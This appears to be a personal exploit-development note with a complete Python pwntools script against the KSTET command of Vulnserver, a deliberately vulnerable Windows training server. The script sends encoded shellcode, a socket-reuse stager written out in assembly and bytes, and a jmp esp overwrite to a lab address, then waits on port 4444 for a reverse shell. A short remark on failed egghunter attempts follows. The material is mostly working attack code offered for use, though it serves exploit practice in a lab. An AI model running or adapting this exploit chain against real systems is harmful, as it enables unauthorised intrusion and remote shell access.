#socket_reuse #bof #constrained

## Mitigations *OFF*

```python
from pwn import *

context.update(arch='i386', os="windows")

# Payload
payload =  b""
payload += b"\xdb\xc9\xb8\xde\x14\x60\x07\xd9\x74\x24\xf4"
payload += b"\x5b\x31\xc9\xb1\x52\x83\xc3\x04\x31\x43\x13"
payload += b"\x03\x9d\x07\x82\xf2\xdd\xc0\xc0\xfd\x1d\x11"
payload += b"\xa5\x74\xf8\x20\xe5\xe3\x89\x13\xd5\x60\xdf"
payload += b"\x9f\x9e\x25\xcb\x14\xd2\xe1\xfc\x9d\x59\xd4"
payload += b"\x33\x1d\xf1\x24\x52\x9d\x08\x79\xb4\x9c\xc2"
payload += b"\x8c\xb5\xd9\x3f\x7c\xe7\xb2\x34\xd3\x17\xb6"
payload += b"\x01\xe8\x9c\x84\x84\x68\x41\x5c\xa6\x59\xd4"
payload += b"\xd6\xf1\x79\xd7\x3b\x8a\x33\xcf\x58\xb7\x8a"
payload += b"\x64\xaa\x43\x0d\xac\xe2\xac\xa2\x91\xca\x5e"
payload += b"\xba\xd6\xed\x80\xc9\x2e\x0e\x3c\xca\xf5\x6c"
payload += b"\x9a\x5f\xed\xd7\x69\xc7\xc9\xe6\xbe\x9e\x9a"
payload += b"\xe5\x0b\xd4\xc4\xe9\x8a\x39\x7f\x15\x06\xbc"
payload += b"\xaf\x9f\x5c\x9b\x6b\xfb\x07\x82\x2a\xa1\xe6"
payload += b"\xbb\x2c\x0a\x56\x1e\x27\xa7\x83\x13\x6a\xa0"
payload += b"\x60\x1e\x94\x30\xef\x29\xe7\x02\xb0\x81\x6f"
payload += b"\x2f\x39\x0c\x68\x50\x10\xe8\xe6\xaf\x9b\x09"
payload += b"\x2f\x74\xcf\x59\x47\x5d\x70\x32\x97\x62\xa5"
payload += b"\x95\xc7\xcc\x16\x56\xb7\xac\xc6\x3e\xdd\x22"
payload += b"\x38\x5e\xde\xe8\x51\xf5\x25\x7b\x9e\xa2\x24"
payload += b"\x7e\x76\xb1\x26\x91\xda\x3c\xc0\xfb\xf2\x68"
payload += b"\x5b\x94\x6b\x31\x17\x05\x73\xef\x52\x05\xff"
payload += b"\x1c\xa3\xc8\x08\x68\xb7\xbd\xf8\x27\xe5\x68"
payload += b"\x06\x92\x81\xf7\x95\x79\x51\x71\x86\xd5\x06"
payload += b"\xd6\x78\x2c\xc2\xca\x23\x86\xf0\x16\xb5\xe1"
payload += b"\xb0\xcc\x06\xef\x39\x80\x33\xcb\x29\x5c\xbb"
payload += b"\x57\x1d\x30\xea\x01\xcb\xf6\x44\xe0\xa5\xa0"
payload += b"\x3b\xaa\x21\x34\x70\x6d\x37\x39\x5d\x1b\xd7"
payload += b"\x88\x08\x5a\xe8\x25\xdd\x6a\x91\x5b\x7d\x94"
payload += b"\x48\xd8\x9d\x77\x58\x15\x36\x2e\x09\x94\x5b"
payload += b"\xd1\xe4\xdb\x65\x52\x0c\xa4\x91\x4a\x65\xa1"
payload += b"\xde\xcc\x96\xdb\x4f\xb9\x98\x48\x6f\xe8"

# Socket reuse shellcode
"""
push esp        ;
pop eax         ;
add ax, 0x188   ; Get pointer to socket descriptor, (const a, exploit specific)

sub esp, 0x64   ; Make space for args on stack (x86), (const b, not exploit specific)

xor ebx,ebx ;
push ebx    ; Push 0 onto the stack for the flag argument

add bh, 0x4 ;
push ebx    ; Push 0x400 to stack for buffer length argument (0x00 in bl so => 1024)

push esp        ;
pop ebx         ;
add ebx, 0x64   ; (const B, not exploit specific)
push ebx        ; Push pointer to output buffer location

push dword ptr ds:[eax] ; Pushes the value of the socket descriptor to stack

mov eax, 0x40252c90 ; recv shifted to left and NOP added, (const c, recv addr)  
shr eax, 8          ; shift it right, removing NOP and adding 00
call eax            ; calls the function
"""

# len 36
shellcode = b"\x54\x58\x66\x05\x88\x01\x83\xec\x64"
shellcode += b"\x31\xdb\x53\x80\xc7\x04\x53\x54\x5b"
shellcode += b"\x83\xc3\x64\x53\x3e\xff\x30\xb8\x90"
shellcode += b"\x2c\x25\x40\x3e\xc1\xe8\x08\xff\xd0"

# Construct trigger
eip = p32(0x625011af) # jmp esp
jump_back = b"\x83\xc0\x06\xff\xe0"

trigger = shellcode + b"\x90" * (70 - len(shellcode))+ eip + jump_back

# Initiate connection
SERVER = "192.168.1.7"
PORT = 9999

print("[!] Initiating KSTET VULNSERVER exploit with socket re-use\n")
target = remote(SERVER, PORT)
target.recvline()

print("\n[!] Sending KSTET trigger. Length: " + str(len(trigger)))
target.sendline(b"KSTET " + trigger)

print("[!] Sending Payload. Length: " + str(len(payload)) + "\n")
target.sendline(payload)
target.close()

# Get reverse shell
print("\n[!] Collecting reverse shell:\n")

l = listen(4444)
_ = l.wait_for_connection()
l.interactive()
```
For whatever reason, egghunters really don't want to work with KSTEST no matter the OS build. Never got to the bottom of this. I don't think its a egg-hunter size issue as some others have mentioned. Definitely would require a WOW64 egg-hunter if it is going to work. Probably to do with constraints on the msfshellcode rather than egghunter.